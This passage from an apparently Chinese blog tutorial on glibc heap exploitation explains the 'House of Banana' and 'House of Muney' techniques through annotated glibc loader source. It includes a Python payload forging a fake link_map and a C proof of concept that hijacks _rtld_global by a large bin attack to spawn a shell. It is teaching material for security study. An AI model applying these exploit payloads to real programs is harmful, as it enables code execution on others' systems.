|| i == nloaded);</span><br><span class="line">	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">	     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">	     the main namespace.  */</span></span><br><span class="line">	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">			 <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure></div>

<p>这段代码的主要逻辑是遍历 _dl_ns 数组，对于_dl_ns 中的某个元素，将 _ns_loaded 链表中的元素放入 maps 数组然后遍历 maps 数组。对于 maps 数组中的每个元素，如果满足一些条件，最终会调用其中 <code>l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code> 指向的函数数组中的所有函数。</p>
<p>通过分析可知可以利用 large bin attack 劫持 _rtld_global 的 _ns_loaded 指针然后伪造 link_map 链表从而劫持程序流程。</p>
<p>在伪造 link_map 的时候需要绕过如下检查：</p>
<ul>
<li><p>为了确保伪造的 link_map 能够加入到 map 数组中，需要令 <code>l_real</code> 指针指向 link_map 结构体自身。  </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">  &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line">  </span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>为了绕过如下检查，需要让 link_map 链表中的元素个数为 4 ，因为 _rtld_global 中的 _ns_nloaded 默认为 4 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>为了确保能够进入下面的 if 判断，需要让该 link_map 的 l_init_called 位置 1 .</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_init_called)</span><br></pre></td></tr></table></figure></div>

<p>最终伪造的结构如下图所示，其中 link_map 链表可以伪造到一个 chunk 中，或者将 l_next 指针指向原来的 link_map 链表：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d9e1f626bcecb35ba724ac9a80266490.png"
                     
                ><br>然而这个 <code>link_map</code> 不能随便伪造，否则过不了 <code>_dl_sort_maps</code> 函数。原作者伪造的 <code>link_map</code> 结构如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e6dcaa9f3a5093d754c6ff38efdea67c.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ></li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">2</span> + <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 2</span></span><br><span class="line">payload += p64(link_map_addr)  <span class="comment"># 3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 4</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">3</span> + <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">2</span> + <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">3</span> + <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">8</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 13</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x30</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x20 l_info[DT_FINI_ARRAY]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x21</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x23</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x22 l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x23 &lt;-l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">payload += p64(<span class="number">8</span>)  <span class="comment"># 0x24</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span> * <span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># 0x30 &lt;-l_info[DT_FINI_ARRAY]</span></span><br><span class="line">payload += p64(link_map_addr + <span class="number">0x32</span> * <span class="number">8</span> + <span class="number">0x10</span>)  <span class="comment"># 0x31</span></span><br><span class="line">payload += p64(one_gadget)  <span class="comment"># 0x32</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x334</span> - <span class="number">0x10</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p8(<span class="number">1</span> &lt;&lt; <span class="number">4</span>)  <span class="comment"># l-&gt;l_init_called</span></span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_banana" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span> - <span class="number">0x702e0</span>;</span><br><span class="line">    <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x5e6040</span>;</span><br><span class="line">    <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr0);</span><br><span class="line">    <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">    <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">    *(<span class="type">size_t</span> *) (ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake a _rtld_global</span></span><br><span class="line">    <span class="type">size_t</span> fake_rtld_global_addr = (<span class="type">size_t</span>) (ptr1 - <span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *) ptr1;</span><br><span class="line">    <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">    fake_rtld_global[<span class="number">1</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">2</span> + <span class="number">3</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">3</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">2</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">3</span> + <span class="number">3</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">3</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">3</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">8</span> + <span class="number">3</span>] = <span class="number">0</span>;<span class="comment">//l_next</span></span><br><span class="line">    fake_rtld_global[<span class="number">8</span> + <span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//fake a fini_array segment</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x20</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x30</span>];<span class="comment">//l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x22</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x23</span>];<span class="comment">//l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x23</span> + <span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;<span class="comment">//l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_rtld_global[<span class="number">-2</span>] = (<span class="type">size_t</span>) &amp;fake_rtld_global[<span class="number">0x32</span>];<span class="comment">//l_addr</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//funcs</span></span><br><span class="line">    fake_rtld_global[<span class="number">0x32</span>] = (<span class="type">size_t</span>) backdoor;<span class="comment">//array[0]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">// l_init_called</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Muney"><a href="#House-of-Muney" class="headerlink" title="House of Muney"></a>House of Muney</h1><p>在 glibc 中如果申请一块很大的内存会调用 <code>mmap</code> 分配一块贴近 glibc 的内存，此时如果修改掉 chunk 头的 size 然后释放掉就会将 glibc 中的部分内存释放掉，此时再次申请一块很大的内存会把释放掉的 glibc 重新申请回来，从而完成对 glibc 的劫持。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/c9185a13808c3e1cf61d21b43ab5eec5.png"
                     
                ><br>劫持 glibc 后，可以通过伪造延迟绑定相关结构劫持程序执行流程。</p>
<p>在延迟绑定过程有如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve_xsavec -&gt; _dl_fixup -&gt; _dl_lookup_symbol_x -&gt; do_lookup_x</span><br></pre></td></tr></table></figure></div>

<p><code>do_lookup_x</code> 需要注意的地方写在代码注释中了，<strong>具体需要伪造的结构的位置以及需要伪造的值通过调试确定</strong>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__attribute_noinline__</span><br><span class="line"><span class="title function_">do_lookup_x</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *undef_name, <span class="type">uint_fast32_t</span> new_hash,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *old_hash, <span class="type">const</span> ElfW(Sym) *ref,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> sym_val *result, <span class="keyword">struct</span> r_scope_elem *scope, <span class="type">size_t</span> i,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            <span class="keyword">struct</span> link_map *skip, <span class="type">int</span> type_class, <span class="keyword">struct</span> link_map *undef_map)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n = scope-&gt;r_nlist;</span><br><span class="line">    <span class="comment">/* Make sure we read the value before proceeding.  Otherwise we</span></span><br><span class="line"><span class="comment">       might use r_list pointing to the initial scope and r_nlist being</span></span><br><span class="line"><span class="comment">       the value after a resize.  That is the only path in dl-open.c not</span></span><br><span class="line"><span class="comment">       protected by GSCOPE.  A read barrier here might be to expensive.  */</span></span><br><span class="line">    __asm <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;&quot;</span> : <span class="string">&quot;+r&quot;</span> (n), <span class="string">&quot;+m&quot;</span> (scope-&gt;r_list))</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">list</span> =</span> scope-&gt;r_list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> <span class="built_in">list</span>[i]-&gt;l_real;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Here come the extra test needed for `_dl_lookup_symbol_skip&#x27;.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span> == skip)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Don&#x27;t search the executable when resolving a copy reloc.  */</span></span><br><span class="line">        <span class="keyword">if</span> ((type_class &amp; ELF_RTYPE_CLASS_COPY) &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Do not look into objects which are going to be removed.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_removed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Print some debugging info if wanted.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_SYMBOLS))</span><br><span class="line">            _dl_debug_printf(<span class="string">&quot;symbol=%s;  lookup in file=%s [%lu]\n&quot;</span>,</span><br><span class="line">                             undef_name, DSO_FILENAME (<span class="built_in">map</span>-&gt;l_name),</span><br><span class="line">                             <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the hash table is empty there is nothing to do here.  */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;l_nbuckets == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        Elf_Symndx symidx;</span><br><span class="line">        <span class="type">int</span> num_versions = <span class="number">0</span>;</span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *versioned_sym = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* The tables for this map.  */</span></span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_SYMTAB]);</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (<span class="built_in">map</span>, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">        <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *bitmask = <span class="built_in">map</span>-&gt;l_gnu_bitmask;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (bitmask != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits]; <span class="comment">// 在对应位置伪造 bitmask_word 。</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift) &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1) &amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>)) &#123; <span class="comment">// 伪造 bitmask_word 通过这个判断，具体是要让 bitmask_word 的 hashbit1 和 hashbit2 两个位都置位，需要通过调试确定。</span></span><br><span class="line">                Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash % <span class="built_in">map</span>-&gt;l_nbuckets]; <span class="comment">// 在对应位置伪造 bucket 的值。</span></span><br><span class="line">                <span class="keyword">if</span> (bucket != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];<span class="comment">// 在对应位置伪造 hasharr 的值为 new_hash 。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span> &#123;</span><br><span class="line">                            symidx = ELF_MACHINE_HASH_SYMIDX (<span class="built_in">map</span>, hasharr);</span><br><span class="line">                            sym = check_match(undef_name, ref, version, flags, <span class="comment">// 进这个函数，symtab[symidx] 对应位置需要伪造符号表。</span></span><br><span class="line">                                              type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">                                              strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">                                              &amp;num_versions);</span><br><span class="line">                            <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">                                <span class="keyword">goto</span> found_it;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* No symbol found.  */</span></span><br><span class="line">            symidx = SHN_UNDEF;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If we have seen exactly one versioned symbol while we are</span></span><br><span class="line"><span class="comment">       looking for an unversioned symbol and the version is not the</span></span><br><span class="line"><span class="comment">       default version we still accept this symbol since there are</span></span><br><span class="line"><span class="comment">       no possible ambiguities.  */</span></span><br><span class="line">        sym = num_versions == <span class="number">1</span> ? versioned_sym : <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sym != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            found_it:</span><br><span class="line">            <span 